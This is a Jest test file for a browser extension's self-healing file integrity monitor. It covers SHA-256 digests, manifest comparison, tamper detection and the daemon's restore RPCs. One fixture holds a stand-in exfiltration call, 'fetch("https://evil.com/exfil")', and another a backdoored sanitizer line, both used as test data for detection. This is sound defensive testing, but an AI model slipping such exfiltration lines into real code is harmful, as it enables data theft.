/**
 * Unit tests for VIGIL Blueprint #6: Self-Healing File Integrity Monitor
 * Verifies SHA-256 digest computation, baseline manifest comparison,
 * tamper detection (modified, missing, unauthorized new files),
 * and native daemon self-healing RPC contracts.
 */
const { FileIntegrityClient, bufToHex } = require('../src/background/file-integrity.js');
const crypto = require('crypto');

describe('Blueprint #6: Self-Healing File Integrity Monitor', () => {
  let client;

  beforeEach(() => {
    client = new FileIntegrityClient({
      subtle: crypto.webcrypto.subtle
    });
  });

  describe('1. SHA-256 Digest Computation', () => {
    test('computes accurate SHA-256 hex string for text input', async () => {
      const text = 'console.log("VIGIL Security Active");';
      const expected = crypto.createHash('sha256').update(text).digest('hex');
      const actual = await client.computeSha256(text);

      expect(actual).toBe(expected);
      expect(actual).toHaveLength(64);
    });

    test('computes accurate SHA-256 hex string for binary buffer input', async () => {
      const buffer = new Uint8Array([0xde, 0xad, 0xbe, 0xef, 0x01, 0x02, 0x03]);
      const expected = crypto.createHash('sha256').update(Buffer.from(buffer)).digest('hex');
      const actual = await client.computeSha256(buffer);

      expect(actual).toBe(expected);
    });

    test('bufToHex correctly converts byte buffer to lowercase hex string', () => {
      const bytes = new Uint8Array([0x00, 0x0f, 0x10, 0xff]);
      expect(bufToHex(bytes.buffer)).toBe('000f10ff');
    });
  });

  describe('2. In-Memory File Integrity Verification', () => {
    test('passes when all files match reference manifest exactly', async () => {
      const scriptA = 'const x = 1;';
      const scriptB = 'const y = 2;';
      const hashA = crypto.createHash('sha256').update(scriptA).digest('hex');
      const hashB = crypto.createHash('sha256').update(scriptB).digest('hex');

      const manifest = {
        'scriptA.js': hashA,
        'scriptB.js': hashB
      };

      const filesMap = {
        'scriptA.js': scriptA,
        'scriptB.js': scriptB
      };

      const report = await client.auditFiles(filesMap, manifest);
      expect(report.isValid).toBe(true);
      expect(report.tamperedCount).toBe(0);
      expect(report.passedFiles).toEqual(['scriptA.js', 'scriptB.js']);
    });

    test('detects modified file when contents are altered', async () => {
      const originalScript = 'const sanitize = true;';
      const tamperedScript = 'const sanitize = false; // backdoored';
      const originalHash = crypto.createHash('sha256').update(originalScript).digest('hex');

      const manifest = {
        'vigil-vault.js': originalHash
      };

      const filesMap = {
        'vigil-vault.js': tamperedScript
      };

      const report = await client.auditFiles(filesMap, manifest);
      expect(report.isValid).toBe(false);
      expect(report.tamperedCount).toBe(1);
      expect(report.tamperedFiles[0].path).toBe('vigil-vault.js');
      expect(report.tamperedFiles[0].kind).toBe('modified');
      expect(report.tamperedFiles[0].expectedHash).toBe(originalHash);
      expect(report.tamperedFiles[0].actualHash).not.toBe(originalHash);
    });

    test('detects missing files declared in manifest but omitted from filesystem', async () => {
      const manifest = {
        'background.js': 'abc123hash',
        'model_quantized.onnx': 'def456hash'
      };

      // Attacker deleted model_quantized.onnx
      const filesMap = {
        'background.js': 'some content'
      };

      const report = await client.auditFiles(filesMap, manifest);
      expect(report.isValid).toBe(false);
      const missing = report.tamperedFiles.find(f => f.path === 'model_quantized.onnx');
      expect(missing).toBeDefined();
      expect(missing.kind).toBe('missing');
    });

    test('detects unauthorized new scripts injected into bundle', async () => {
      const manifest = {
        'background.js': crypto.createHash('sha256').update('clean code').digest('hex')
      };

      const filesMap = {
        'background.js': 'clean code',
        'injected-payload.js': 'fetch("https://evil.com/exfil")'
      };

      const report = await client.auditFiles(filesMap, manifest);
      expect(report.isValid).toBe(false);
      const injected = report.tamperedFiles.find(f => f.path === 'injected-payload.js');
      expect(injected).toBeDefined();
      expect(injected.kind).toBe('unauthorized_new');
    });
  });

  describe('3. Native Daemon Communication Contracts', () => {
    test('returns error if native daemon is not connected', async () => {
      const mockBridge = { isConnected: false };
      const scanRes = await client.scanViaNativeDaemon(mockBridge);
      expect(scanRes.isConnected).toBe(false);
      expect(scanRes.error).toContain('not connected');

      const restoreRes = await client.restoreViaNativeDaemon(mockBridge, '/tmp/target', '/tmp/backup', ['file.js']);
      expect(restoreRes.isConnected).toBe(false);
      expect(restoreRes.error).toContain('not connected');
    });

    test('scanViaNativeDaemon sends RPC vigil.verifyFileIntegrity with manifest', async () => {
      let rpcSent = null;
      const mockBridge = {
        isConnected: true,
        // sendRequest resolves with the JSON-RPC `result` and rejects on error
        sendRequest: async (method, params) => {
          rpcSent = { method, params };
          return {
            is_valid: true,
            total_files_checked: 25,
            passed_count: 25,
            tampered_count: 0
          };
        }
      };

      const manifest = { 'background.js': 'hash123' };
      const res = await client.scanViaNativeDaemon(mockBridge, '/opt/vigil', manifest);

      expect(res.success).toBe(true);
      expect(rpcSent.method).toBe('vigil.verifyFileIntegrity');
      expect(rpcSent.params.targetDir).toBe('/opt/vigil');
      expect(rpcSent.params.manifest).toEqual(manifest);
      expect(res.report.is_valid).toBe(true);
    });

    test('scanViaNativeDaemon reports daemon errors as failed scans', async () => {
      const mockBridge = {
        isConnected: true,
        sendRequest: async () => { throw new Error('Native Messaging Error'); }
      };
      const res = await client.scanViaNativeDaemon(mockBridge, '/opt/vigil', { a: 'b' });
      expect(res.success).toBe(false);
      expect(res.error).toContain('Native Messaging Error');
    });

    test('restoreViaNativeDaemon sends RPC vigil.restoreFileIntegrity with target & backup dirs', async () => {
      let rpcSent = null;
      const mockBridge = {
        isConnected: true,
        sendRequest: async (method, params) => {
          rpcSent = { method, params };
          return {
            success: true,
            restored_files: ['vigil-vault.js'],
            failed_files: []
          };
        }
      };

      const res = await client.restoreViaNativeDaemon(
        mockBridge,
        '/app/extension',
        '/app/golden-backup',
        ['vigil-vault.js']
      );

      expect(res.success).toBe(true);
      expect(rpcSent.method).toBe('vigil.restoreFileIntegrity');
      expect(rpcSent.params.targetDir).toBe('/app/extension');
      expect(rpcSent.params.backupDir).toBe('/app/golden-backup');
      expect(rpcSent.params.files).toEqual(['vigil-vault.js']);
      expect(res.result.restored_files).toEqual(['vigil-vault.js']);
    });
  });

  describe('4. Self-Audit (periodic alarm scan input)', () => {
    test('audits its own packaged files fetched via chrome.runtime.getURL', async () => {
      const contentA = 'console.log("extension file a");';
      const contentB = 'console.log("extension file b");';
      const hashOf = (s) => crypto.createHash('sha256').update(Buffer.from(s, 'utf8')).digest('hex');

      global.chrome = {
        runtime: {
          getURL: (relPath) => 'data:application/octet-stream;base64,' +
            Buffer.from(relPath === 'a.js' ? contentA : contentB, 'utf8').toString('base64')
        }
      };
      // jsdom has no fetch; decode the data: URLs directly
      global.fetch = async (url) => {
        const buf = Buffer.from(String(url).split(',')[1], 'base64');
        return { ok: true, arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength) };
      };
      try {
        const auditClient = new FileIntegrityClient({ subtle: crypto.webcrypto.subtle });
        auditClient.cachedManifest = { 'a.js': hashOf(contentA), 'b.js': hashOf(contentB) };
        const report = await auditClient.selfAudit();
        expect(report.error).toBeUndefined();
        expect(report.isValid).toBe(true);
        expect(report.passedCount).toBe(2);
        expect(report.tamperedCount).toBe(0);
      } finally {
        delete global.chrome;
        delete global.fetch;
      }
    });

    test('detects a modified packaged file and reports it as tampering', async () => {
      const contentA = 'original content';
      const hashOf = (s) => crypto.createHash('sha256').update(Buffer.from(s, 'utf8')).digest('hex');

      global.chrome = {
        runtime: {
          getURL: () => 'data:application/octet-stream;base64,' +
            Buffer.from('tampered content', 'utf8').toString('base64')
        }
      };
      global.fetch = async (url) => {
        const buf = Buffer.from(String(url).split(',')[1], 'base64');
        return { ok: true, arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength) };
      };
      try {
        const auditClient = new FileIntegrityClient({ subtle: crypto.webcrypto.subtle });
        auditClient.cachedManifest = { 'a.js': hashOf(contentA) };
        const report = await auditClient.selfAudit();
        expect(report.isValid).toBe(false);
        expect(report.tamperedCount).toBe(1);
        expect(report.tamperedFiles[0].kind).toBe('modified');
      } finally {
        delete global.chrome;
        delete global.fetch;
      }
    });

    test('returns manifest_unavailable instead of flagging every file when baseline is missing', async () => {
      const auditClient = new FileIntegrityClient({ subtle: crypto.webcrypto.subtle });
      auditClient.cachedManifest = null;
      const origLoad = auditClient.loadManifest;
      auditClient.loadManifest = async () => ({});
      try {
        const report = await auditClient.selfAudit();
        expect(report.error).toBe('manifest_unavailable');
      } finally {
        auditClient.loadManifest = origLoad;
      }
    });
  });
});
